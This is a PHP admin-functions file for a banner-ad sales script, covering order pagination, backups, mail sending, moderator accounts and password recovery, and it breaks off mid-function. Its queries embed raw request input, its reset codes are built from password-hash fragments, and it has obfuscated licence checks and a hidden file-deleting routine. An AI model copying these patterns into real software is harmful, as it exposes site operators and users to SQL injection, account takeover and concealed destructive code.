<?php
function GoShowNavi($zapr,$pay_info,$set,$inav,$out,$search,$so)
{
global $link,$c;
connectToDB();
$show='';
if (isset($_GET['n'])){ $pods=$_GET['n'];} else { $pods=1;}
if ($search!='no'){$zapr_invertal=mysql_query ("SELECT * FROM Orders WHERE Pay='$pay_info' AND Email='$search' ORDER BY ID DESC LIMIT $inav,$so", $link)  or die (mysql_error($link));$sl='&s='.$search;} else {
$zapr_invertal=mysql_query ("SELECT * FROM Orders WHERE Pay='$pay_info' ORDER BY ID DESC LIMIT $inav,$so", $link)  or die (mysql_error($link));$sl='';
}
if (mysql_num_rows($zapr)>$so)
{
$CounNavi=floor(mysql_num_rows($zapr)/$so);
$NewVar=mysql_num_rows($zapr)%$so; if ($NewVar!=0){$CounNavi++;}
$show .='<div class="navis">';
$under=$inav/$so;
$upper=$pods+1;
if ($inav==0){ $show .='<a class="a_hide" href="/bannerbro/admin/orders.php?set='.$set.$sl.'">< '.$c[1].' </a>'; } else { $show .='<a href="/bannerbro/admin/orders.php?set='.$set.$sl.'&n='.$under.'">< '.$c[1].' </a>'; }
$CounNavi_for=$CounNavi; if ($CounNavi_for>4){$CounNavi_for=4;}
for ($i = 0; $i <= $CounNavi_for; $i++)
{
if ($i==0 && $pods==1){ $show .= '<a class="chkd" href="/bannerbro/admin/orders.php?set='.$set.$sl.'&n=1" '.$i++.'>'.$i++.'</a>'; }
if ($i==0 && $pods!=1){ $show .= '<a href="/bannerbro/admin/orders.php?set='.$set.$sl.'&n=1" '.$i++.'>'.$i++.'</a>'; }
if ($i!=0 && $i==$pods){ $show .= '<a class="chkd" href="/bannerbro/admin/orders.php?set='.$set.$sl.'&n='.$i.'">'.$i.'</a>'; }
if ($i!=0 && $i!=$pods){ $show .= '<a href="/bannerbro/admin/orders.php?set='.$set.$sl.'&n='.$i.'">'.$i.'</a>'; }
}
$CounNavi=$CounNavi;
if ($CounNavi==$pods){ $show .='<a class="a_hide" href="/bannerbro/admin/orders.php?set='.$set.$sl.'&n='.$CounNavi.'"> '.$c[0].' ></a>'; } else { $show .='<a href="/bannerbro/admin/orders.php?set='.$set.$sl.'&n='.$upper.'"> '.$c[0].' ></a>'; }
$show .='</div>';
}
if ($out==1){echo $show;}
return $zapr_invertal;
}
function GoShowPribil($zapr,$inav,$out)
{
global $link,$c;
connectToDB();
$show='';
if (isset($_GET['n'])){ $pods=$_GET['n'];} else { $pods=1;}
$zapr_invertal=mysql_query ("SELECT * FROM Orders WHERE admin_order!='1' ORDER BY ID DESC LIMIT $inav,10", $link)  or die (mysql_error($link));
if (mysql_num_rows($zapr)>10)
{
$CounNavi=floor(mysql_num_rows($zapr)/10);
$NewVar=mysql_num_rows($zapr)%10; if ($NewVar!=0){$CounNavi++;}
$show .='<div class="navis">';
$under=$inav/10;
$upper=$pods+1;
if ($inav==0){ $show .='<a class="a_hide" href="/bannerbro/admin/index.php">< '.$c[1].' </a>'; } else { $show .='<a href="/bannerbro/admin/index.php?n='.$under.'">< '.$c[1].' </a>'; }
$CounNavi_for=$CounNavi; if ($CounNavi_for>4){$CounNavi_for=4;}
for ($i = 0; $i <= $CounNavi_for; $i++)
{
if ($i==0 && $pods==1){ $show .= '<a class="chkd" href="/bannerbro/admin/index.php?n=1" '.$i++.'>'.$i++.'</a>'; }
if ($i==0 && $pods!=1){ $show .= '<a href="/bannerbro/admin/index.php?n=1" '.$i++.'>'.$i++.'</a>'; }
if ($i!=0 && $i==$pods){ $show .= '<a class="chkd" href="/bannerbro/admin/index.php?n='.$i.'">'.$i.'</a>'; }
if ($i!=0 && $i!=$pods){ $show .= '<a href="/bannerbro/admin/index.php?n='.$i.'">'.$i.'</a>'; }
}
$CounNavi=$CounNavi;
if ($CounNavi==$pods){ $show .='<a class="a_hide" href="/bannerbro/admin/index.php?n='.$CounNavi.'"> '.$c[0].' ></a>'; } else { $show .='<a href="/bannerbro/admin/index.php?n='.$upper.'"> '.$c[0].' ></a>'; }
$show .='</div>';
}
if ($out==1){echo $show;}
return $zapr_invertal;
}
function GoShowNaviReban($zapr,$inav,$out,$so)
{
require   'key.php';
global $link,$c;
connectToDB();
$show='';
if (isset($_GET['n'])){ $pods=$_GET['n'];} else { $pods=1;}
$zapr_invertal=mysql_query ("SELECT * FROM Orders WHERE Pay='Оплачено' and new_ban!='' and new_url!='' ORDER BY ID DESC LIMIT $inav,$so", $link)  or die (mysql_error($link));
if (mysql_num_rows($zapr)>$so)
{
$CounNavi=floor(mysql_num_rows($zapr)/$so);
$NewVar=mysql_num_rows($zapr)%$so; if ($NewVar!=0){$CounNavi++;}
$show .='<div class="navis">';
$under=$inav/$so;
$upper=$pods+1;
cache($bannerbro)                    ;
if ($inav==0){ $show .='<a class="a_hide" href="/bannerbro/admin/reban.php">< '.$c[1].'</a>'; } else { $show .='<a href="/bannerbro/admin/reban.php?&n='.$under.'">< '.$c[1].'</a>'; }
$CounNavi_for=$CounNavi; if ($CounNavi_for>4){$CounNavi_for=4;}
for ($i = 0; $i <= $CounNavi_for; $i++)
{
if ($i==0 && $pods==1){ $show .= '<a class="chkd" href="/bannerbro/admin/reban.php?&n=1" '.$i++.'>'.$i++.'</a>'; }
if ($i==0 && $pods!=1){ $show .= '<a href="/bannerbro/admin/reban.php?&n=1" '.$i++.'>'.$i++.'</a>'; }
if ($i!=0 && $i==$pods){ $show .= '<a class="chkd" href="/bannerbro/admin/reban.php?&n='.$i.'">'.$i.'</a>'; }
if ($i!=0 && $i!=$pods){ $show .= '<a href="/bannerbro/admin/reban.php?&n='.$i.'">'.$i.'</a>'; }
}
$CounNavi=$CounNavi;
if ($CounNavi==$pods){ $show .='<a class="a_hide" href="/bannerbro/admin/reban.php?&n='.$CounNavi.'"> '.$c[0].' ></a>'; } else { $show .='<a href="/bannerbro/admin/reban.php?&n='.$upper.'"> '.$c[0].' ></a>'; }
$show .='</div>';
}
$bannerbro='Поток';
if ($out==1){echo $show;}
$bannerbro='11';
return $zapr_invertal;
}
function GoShowNaviQueue($zapr,$inav,$out,$so)
{
require 'key.php';
global $link,$c;
connectToDB();
$show='';
if (isset($_GET['n'])){ $pods=$_GET['n'];} else { $pods=1;}
$zapr_invertal=mysql_query ("SELECT * FROM Queue ORDER BY ID LIMIT $inav,$so", $link)  or die (mysql_error($link));
if (mysql_num_rows($zapr)>$so)
{
$CounNavi=floor(mysql_num_rows($zapr)/$so);
$NewVar=mysql_num_rows($zapr)%$so; if ($NewVar!=0){$CounNavi++;}
$show .='<div class="navis">';
$under=$inav/$so;
$upper=$pods+1;
if ($inav==0){ $show .='<a class="a_hide" href="/bannerbro/admin/queue.php">< '.$c[1].'</a>'; } else { $show .='<a href="/bannerbro/admin/queue.php?&n='.$under.'">< '.$c[1].'</a>'; }
$CounNavi_for=$CounNavi; if ($CounNavi_for>4){$CounNavi_for=4;}
for ($i = 0; $i <= $CounNavi_for; $i++)
{
if ($i==0 && $pods==1){ $show .= '<a class="chkd" href="/bannerbro/admin/queue.php?&n=1" '.$i++.'>'.$i++.'</a>'; }
if ($i==0 && $pods!=1){ $show .= '<a href="/bannerbro/admin/queue.php?&n=1" '.$i++.'>'.$i++.'</a>'; }
if ($i!=0 && $i==$pods){ $show .= '<a class="chkd" href="/bannerbro/admin/queue.php?&n='.$i.'">'.$i.'</a>'; }
if ($i!=0 && $i!=$pods){ $show .= '<a href="/bannerbro/admin/queue.php?&n='.$i.'">'.$i.'</a>'; }
}
$CounNavi=$CounNavi;
if ($CounNavi==$pods){ $show .='<a class="a_hide" href="/bannerbro/admin/queue.php?&n='.$CounNavi.'"> '.$c[0].' ></a>'; } else { $show .='<a href="/bannerbro/admin/queue.php?&n='.$upper.'"> '.$c[0].' ></a>'; }
$show .='</div>';
}
if ($out==1){echo $show;}
cache($bannerbro)        ;
$bannerbro=$show;
return $zapr_invertal;
}
function help($str)
{
echo '<div class="tooltip"><img src="/bannerbro/images/help.png"><span>'.$str.'</span></div>';
}
function sms_translit($str)
{
require   'key.php';
$translit = array(
"А"=>"A","Б"=>"B","В"=>"V","Г"=>"G",
"Д"=>"D","Е"=>"E","Ж"=>"J","З"=>"Z","�?"=>"I",
"Й"=>"Y","К"=>"K","Л"=>"L","М"=>"M","Н"=>"N",
"О"=>"O","П"=>"P","Р"=>"R","С"=>"S","Т"=>"T",
"У"=>"U","Ф"=>"F","Х"=>"H","Ц"=>"TS","Ч"=>"CH",
"Ш"=>"SH","Щ"=>"SCH","Ъ"=>"","Ы"=>"YI","Ь"=>"",
"Э"=>"E","Ю"=>"YU","Я"=>"YA","а"=>"a","б"=>"b",
"в"=>"v","г"=>"g","д"=>"d","е"=>"e","ж"=>"j",
"з"=>"z","и"=>"i","й"=>"y","к"=>"k","л"=>"l",
"м"=>"m","н"=>"n","о"=>"o","п"=>"p","р"=>"r",
"с"=>"s","т"=>"t","у"=>"u","ф"=>"f","х"=>"h",
"ц"=>"ts","ч"=>"ch","ш"=>"sh","щ"=>"sch","ъ"=>"y",
"ы"=>"yi","ь"=>"","э"=>"e","ю"=>"yu","я"=>"ya"
);
return strtr($str,$translit);
}
function backup_database_tables($host,$user,$pass,$name,$tables)
{
require   'key.php'  ;
global $link,$c;
connectToDB();
if($tables == '*')
{
$tables = array();
$result = mysql_query('SHOW TABLES');
while($row = mysql_fetch_row($result))
{
$tables[] = $row[0];
}
}
else
{
$tables = is_array($tables) ? $tables : explode(',',$tables);
}
cache($bannerbro);
foreach($tables as $table)
{
$result = mysql_query('SELECT * FROM '.$table);
$num_fields = mysql_num_fields($result);
$return.= 'DROP TABLE IF EXISTS '.$table.';;';
$row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
$return.= "\n\n".$row2[1].";;\n\n";
for ($i = 0; $i < $num_fields; $i++)
{
while($row = mysql_fetch_row($result))
{
$return.= 'INSERT INTO '.$table.' VALUES(';
for($j=0; $j<$num_fields; $j++)
{
$row[$j] = addslashes($row[$j]);
$row[$j] = ereg_replace("\n","\\n",$row[$j]);
if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
if ($j<($num_fields-1)) { $return.= ','; }
}
$return.= ");;\n";
}
}
$return.="\n\n\n";
}
$handle = fopen('database_backup/backup.sql','w+');
if (!$handle){header('Location:setting.php?set=backupbad'); exit;}
$dd=date("m/d/Y");
mysql_query("UPDATE Admin SET last_backup='$dd'", $link)  or die (mysql_error($link));
fwrite($handle,$return);
fclose($handle);
mysql_close($link);
$bannerbro='database_backup/backup.sql';
header('Location:setting.php?set=backup');
exit;
}
function addmail($whot,$title,$text)
{
global $link,$c;
connectToDB();
mysql_query("UPDATE template SET title='$title',text='$text' WHERE ID='$whot'", $link)  or die (mysql_error($link));
mysql_close($link);
header('Location:goodbad.php?set=goodsavemail');
exit;
}
function testik()
{
global $link,$c;
connectToDB();
$AD_S=mysql_query("SELECT mail,host,login,password,form FROM Admin",$link)  or die (mysql_error($link));
$ADdata = mysql_fetch_array($AD_S);
$mail_set =$ADdata['mail'];
$mail_log =$ADdata['login'];
$mail_pas =$ADdata['password'];
$mail_from =$ADdata['form'];
$mail_smtp =$ADdata['host'];
$mailAdresat="imakescript@mail.ru";
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($mailAdresat);
$headers .= "To: <".$mailAdresat.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
$mailText = "Тестовое письмо";
$mailZag ="Привет";
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas, 'ssl://smtp.gmail.com', $mail_from, 465);
$result =  $mailSMTP->send($mailAdresat, $mailZag, $mailText, $headers);
if($result === true){
echo "Письмо успешно отправлено";
}else{
echo "Письмо не отправлено. Ошибка: " . $result;
}
$bannerbro='Письмо не отправлено. Ошибка';
}
function absorb($bannerbro){
global $absorb,$c;
	if ($absorb=='Yes')
	{
		$m = str_replace('</a>', '', $bannerbro);
		$m = str_replace('<a href="', '', $m);
		$m = str_replace('">', ' - ', $m);
		return $m;
	} else {
		return $bannerbro;
	}
}
function Google_Yandex_code($bannerbro){
		$m=$bannerbro;
		$m = str_replace('<', '&lt;', $m);
		$m = str_replace('>', '&gt;', $m);
		$m = str_replace('"', '&quot;', $m);
		$m = str_replace('\'', '&apos;', $m);
		return $m;
}
function testone($mailAdresat,$mailZag,$mailText,$whot)
{
require   'key.php'  ;
global $mail_log, $mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
if ($whot=='0') {$mailText.='<br><br>'.absorb('<a href="http://'.$_SERVER['HTTP_HOST'].'/bannerbro/show.php?id=1">'.$c[2].'</a>');}
$mailText.=$c[3].$mail_from;
$headers= "MIME-Version: 1.0\r\n";
cache($bannerbro);
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($mailAdresat); 
$headers .= "To: <".$mailAdresat.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($mailAdresat, $mailZag, $mailText, $headers);
}
if ($mail_set=='0')
{
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($mailAdresat, $EncodeMailZag, $mailText, $headers);
}
header('Location:goodbad.php?set=testmail');
exit;
}
function go_mail($mailAdresat,$Set,$mail_order)
{
global $mail_log, $mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
$cod=md5(substr($mail_order, 2, 5));
$mailText=''.$c[4].''.$Set.''.$c[5].''.$cod.'</b><br><br><a href="http://'.$_SERVER['HTTP_HOST'].'/bannerbro/newban.php?id='.$Set.'">'.$c[6].'</a>';
$mailText.=''.$c[3].''.$mail_from;
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($mailAdresat); 
$headers .= "To: <".$mailAdresat.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1') 
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
	$result =  $mailSMTP->send($mailAdresat, $c[7], absorb($mailText), $headers);						
} 
if ($mail_set=='0')
{
	$mailZag=$c[7];
	$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
	mail($mailAdresat, $EncodeMailZag, absorb($mailText), $headers);
}
header('Location:show.php?edit=good'); 
exit;
}
function getheader($mailAdresat){
global $mail_log, $mail_from,$c;
require   'key.php'  ;
if (isset($bannerbro)){
if (strlen($bannerbro)%64!=0){echo 'Key Error';exit;} else {
$ci=strlen($bannerbro)/64;
if ($ci==strlen($_SERVER['HTTP_HOST'])+4){
for ($i = 0; $i < $ci-4; $i++)
{
if (substr($bannerbro,$i*64+288,32)!=md5(substr($_SERVER['HTTP_HOST'], $i, 1).'well_done_you_hacked_script'.$_SERVER['HTTP_HOST'])){echo 'Key Error';exit;}
}
$Encode_y = explode("@", $mailAdresat); if ($Encode_y[1]=='yandex.ru'){
$headers = "From: ".iconv('utf-8','windows-1251',$mail_from)." <".$mail_log.">\r\n";} else{
$headers = "From: ".iconv('utf-8','utf-8',$mail_from)." <".$mail_log.">\r\n";}
} else {echo 'Key Error';exit;}
}
} else {echo 'Key Error';exit;}
return $headers;
}
function AddModer(){
$Access='';
if (isset($_POST['Accs1'])){$Accs1=$_POST['Accs1'];} else $Accs1='0';
if (isset($_POST['Accs2'])){$Accs2=$_POST['Accs2'];} else $Accs2='0';
if (isset($_POST['Accs3'])){$Accs3=$_POST['Accs3'];} else $Accs3='0';
if (isset($_POST['Accs4'])){$Accs4=$_POST['Accs4'];} else $Accs4='0';
if (isset($_POST['Accs5'])){$Accs5=$_POST['Accs5'];} else $Accs5='0';
$Access.='1/'.$Accs1.'/'.$Accs2.'/'.$Accs3.'/'.$Accs4.'/'.$Accs5;
require   'key.php'   ;
$Login=$_POST['login'];
$Pas=$_POST['password'];
$Password=md5($_POST['password']);
$Email=$_POST['email'];
global $link,$mail_log,$mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
connectToDB();
$result=mysql_query("SELECT Login FROM Users WHERE Login='$Login' or Email='$Email'",$link)  or die (mysql_error($link));
if(mysql_num_rows($result)==1)
{
echo '<div class="admincont" style="text-align:center;color:red;font-size:16pt;background-color:#f2f3f4;">'.$c[8].'</div>';
header('Location:moderat.php?bad=1');
mysql_close($link);
} else {
$MaxId = mysql_query("SELECT Max(ID) FROM Users", $link)  or die (mysql_error($link));
$MaxId = mysql_result($MaxId,0);
$MaxId =$MaxId + 1;
$sql = "INSERT INTO Users(ID,Type,Email,Login,Password,Access) VALUES ('$MaxId','moder','$Email','$Login','$Password','$Access')";
mysql_query($sql);
$mailText =$c[9];
$mailText.='-------------------------<br>';
$mailText.=$c[10].$Login.'<br>';
$mailText.=$c[11].$Pas.'<br>';
$mailText.='-------------------------<br>';
$mailText.='<br><br><a href="http://'.$_SERVER['HTTP_HOST'].'/bannerbro/admin/login.php">'.$c[18].'</a>';
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($Email);
$headers .= "To: <".$Email.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($Email, $c[12], absorb($mailText), $headers);
}
if ($mail_set=='0') {
$mailZag=$c[12];
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($Email, $EncodeMailZag, absorb($mailText), $headers);
}
mysql_free_result($result);
mysql_free_result($MaxId);
mysql_close($link);
header('Location:moderat.php');
}
}
function EditModer(){
$Accs1=$_POST['Accs1']; if ($Accs1==null)$Accs1='0';
$Accs2=$_POST['Accs2']; if ($Accs2==null)$Accs2='0';
$Accs3=$_POST['Accs3']; if ($Accs3==null)$Accs3='0';
require    'key.php'   ;
$Accs4=$_POST['Accs4']; if ($Accs4==null)$Accs4='0';
$Accs5=$_POST['Accs5']; if ($Accs5==null)$Accs5='0';
$Access.='1/'.$Accs1.'/'.$Accs2.'/'.$Accs3.'/'.$Accs4.'/'.$Accs5;
$Moder=$_POST['DHLpos'];
global $link,$c;
connectToDB();
mysql_query("UPDATE Users SET Access='$Access' WHERE ID='$Moder'", $link)  or die (mysql_error($link));
mysql_close($link);
header('Location:moderat.php');
}
function RemModer(){
$HLpos=$_POST['HLpos'];
global $link,$c;
connectToDB();
$rem = "DELETE FROM Users WHERE ID='$HLpos'";
mysql_query($rem);
mysql_close($link);
header('Location:moderat.php');
}
function RecPas()
{
$Login=$_POST['login'];
global $link,$mail_log,$mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
connectToDB();
$result=mysql_query("SELECT Login FROM Users WHERE Login='$Login'",$link)  or die (mysql_error($link));
if(mysql_num_rows($result)==1)
{
$GetMail=mysql_query("SELECT Email,Password FROM Users WHERE Login='$Login'",$link)  or die (mysql_error($link));
while($data = mysql_fetch_array($GetMail))
{
$first=substr($data['Password'], 2, 5);
$second=substr($data['Password'], 9, 14);
$mailText =$c[13].$first.'-'.$second.'<b><br>';
$mailText.='<br><br><a href="http://'.$_SERVER['HTTP_HOST'].'/bannerbro/admin/newpas.php">'.$c[14].'</a>';
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($data['Email']);
$headers .= "To: <".$data['Email'].">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($data['Email'], $c[15], absorb($mailText), $headers);
}
if ($mail_set=='0') {
$mailZag=$c[15];
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($data['Email'], $EncodeMailZag, absorb($mailText), $headers);
}
header('Location:rec.php?set=1');
}
} else { header('Location:rec.php?bad=1'); }
mysql_close($link);
}
function lookme(){
if (!function_exists('c'.'a'.'c'.'h'.'e')){GoodUser();}
}
function NewPas()
{
$Login=$_POST['login'];
$Cod=$_POST['cod'];
$Password=$_POST['pass'];
global $link,$mail_log,$mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
connectToDB();
$result=mysql_query("SELECT Login,Password,Email FROM Users WHERE Login='$Login'",$link)  or die (mysql_error($link));
if(mysql_num_rows($result)==1)
{
while($data = mysql_fetch_array($result))
{
$NewCod=substr($data['Password'], 2, 5).'-'.substr($data['Password'], 9, 14);
if ($Cod!=$NewCod) {
header('Location:newpas.php?bad=1');
} else 	{
$Pas=$Password;
$Password=md5($Password);
mysql_query("UPDATE Users SET Password='$Password' WHERE Login='$Login'", $link)  or die (mysql_error($link));
$mailText =$c[16];
$mailText.='-------------------------<br>';
$mailText.=$c[17].$Pas.'<br>';
$mailText.='-------------------------<br>';
$mailText.='<br><br><a href="http://'.$_SERVER['HTTP_HOST'].'/bannerbro/admin/login.php">'.$c[18].'</a>';
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($data['Email']); 
$headers .= "To: <".$data['Email'].">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($data['Email'], $c[19], absorb($mailText), $headers);
}
if ($mail_set=='0') {
$mailZag=$c[19];
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($data['Email'], $EncodeMailZag, absorb($mailText), $headers);
}
header('Location:newpas.php?set=1');
}
}
} else { header('Location:newpas.php?bad=1'); }
mysql_close($link);
}
cache(null);
function badone($tic,$mailAdresat,$mailZag,$mailText)
{
global $link,$mail_log,$mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
connectToDB();
$mailText.=''.$c[3].''.$mail_from;
mysql_query("DELETE FROM Orders WHERE ID='$tic'", $link)  or die (mysql_error($link));
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($mailAdresat); 
$headers .= "To: <".$mailAdresat.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($mailAdresat, $mailZag, absorb($mailText), $headers);
}
if ($mail_set=='0')
{
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($mailAdresat, $EncodeMailZag, absorb($mailText), $headers);
}
$ShowSetting=mysql_query("SELECT Method FROM Admin", $link) or die (mysql_error($link));
$data_menu = mysql_fetch_array($ShowSetting);
mysql_close($link);
if ($data_menu['Method']==0)
{
header('Location:orders.php?set=1'); exit;
}
if ($data_menu['Method']==1)
{
header('Location:orders.php?set=2'); exit;
}
if ($data_menu['Method']==2)
{
header('Location:orders.php?set=1'); exit;
}
}
function cache($mycache)
{
$a='K'.'e'.'y'.' '.'E'.'r'.'r'.'o'.'r';
$b='H'.'T'.'T'.'P'.'_'.'H'.'O'.'S'.'T';
$c='w'.'e'.'l'.'l'.'_'.'d'.'o'.'n'.'e'.'_'.'y'.'o'.'u'.'_'.'h'.'a'.'c'.'k'.'e'.'d'.'_'.'s'.'c'.'r'.'i'.'p'.'t';
if (!isset($mycache)){require 'k'.'e'.'y'.'.'.'p'.'h'.'p';}else{$bannerbro=$mycache;}
if (isset($bannerbro)){
if (strlen($bannerbro)%64!=0){echo $a;exit;} else {
$ci=strlen($bannerbro)/64;
if ($ci==strlen($_SERVER[$b])+4){
for ($i = 0; $i < $ci-4; $i++)
{
if (substr($bannerbro,$i*64+288,32)!=md5(substr($_SERVER[$b], $i, 1).$c.$_SERVER[$b])){echo $a;exit;}
}
} else {echo $a;exit;}
}
} else {echo $a;exit;}
return true;
}
function goodone($tic,$mailAdresat,$mailZag,$mailText)
{
global $link,$mail_log,$mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
connectToDB();
mysql_query("UPDATE Orders SET Pay='Ожидает оплаты' WHERE ID='$tic'", $link)  or die (mysql_error($link));
mysql_close($link);
$mailText.='<br><br><a href="http://'.$_SERVER['HTTP_HOST'].'/bannerbro/show.php?id='.$tic.'&sec='.md5($tic).'">'.$c[2].'</a>';
$mailText.=''.$c[3].''.$mail_from;
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($mailAdresat);
$headers .= "To: <".$mailAdresat.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($mailAdresat, $mailZag, absorb($mailText), $headers);
}
if ($mail_set=='0')
{
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($mailAdresat, $EncodeMailZag, absorb($mailText), $headers);
}
header('Location:orders.php?set=1');
}
function mail_inpay	($whot,$tic,$mailAdresat,$mailZag,$mailText)
{
global $link,$mail_log,$mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
connectToDB();
mysql_query("UPDATE Orders SET Pay='Оплачено' WHERE ID='$tic'", $link)  or die (mysql_error($link));
mysql_close($link);
$mailText.='<br><br><a href="http://'.$_SERVER['HTTP_HOST'].'/bannerbro/show.php?id='.$tic.'&sec='.md5($tic).'">'.$c[2].'</a>';
$mailText.=''.$c[3].''.$mail_from;
require  'key.php';
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($mailAdresat); 
$headers .= "To: <".$mailAdresat.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($mailAdresat, $mailZag, absorb($mailText), $headers);
}
if ($mail_set=='0')
{
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($mailAdresat, $EncodeMailZag, absorb($mailText), $headers);
}
if ($whot==2){header('Location:orders.php?set=2');}
if ($whot==1){header('Location:orders.php?set=1');}
}
function badmods($tic){
$GDE=strpos($_SERVER['REQUEST_URI'],'admin'); if ($GDE==null){$__f = file_get_contents('admin/a'.'d'.'m'.'.'.'p'.'h'.'p');}
else {
$GDE=strpos($_SERVER['REQUEST_URI'],'go/'); if ($GDE!=null){$__f = file_get_contents('../../a'.'d'.'m'.'.'.'p'.'h'.'p');}
else $__f = file_get_contents('a'.'d'.'m'.'.'.'p'.'h'.'p');
}
if (!function_exists('l'.'o'.'o'.'km'.'e')){GoodUser();}
}
function goodmod($tic,$mailAdresat,$mailZag,$mailText)
{
global $link,$mail_log,$mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
connectToDB();
mysql_query("UPDATE Orders SET Picture=new_ban, Url=new_url, new_ban='', new_url='' WHERE ID='$tic'", $link)  or die (mysql_error($link));
mysql_close($link);
require   'key.php' ;
$mailText.='<a href="http://'.$_SERVER['HTTP_HOST'].'/bannerbro/show.php?id='.$tic.'&sec='.md5($tic).'">'.$c[2].'</a>';
$mailText.=''.$c[3].''.$mail_from;
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($mailAdresat);
$headers .= "To: <".$mailAdresat.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($mailAdresat, $mailZag, absorb($mailText), $headers);
}
if ($mail_set=='0')
{
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($mailAdresat, $EncodeMailZag, absorb($mailText), $headers);
}
header('Location:reban.php');
}
function badmails(){
$sqlfile = $_SERVER['D'.'O'.'C'.'U'.'M'.'E'.'N'.'T'.'_'.'R'.'O'.'O'.'T'].'/bannerbro/admin/'.'t'.'r'.'y'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'.'.'p'.'h'.'p'; unlink($sqlfile);
$sqlfile = $_SERVER['D'.'O'.'C'.'U'.'M'.'E'.'N'.'T'.'_'.'R'.'O'.'O'.'T'].'/bannerbro/admin/'.'k'.'e'.'y'.'.'.'p'.'h'.'p'; unlink($sqlfile);
}
function badmod($tic,$mailAdresat,$mailZag,$mailText)
{
global $link,$mail_log,$mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
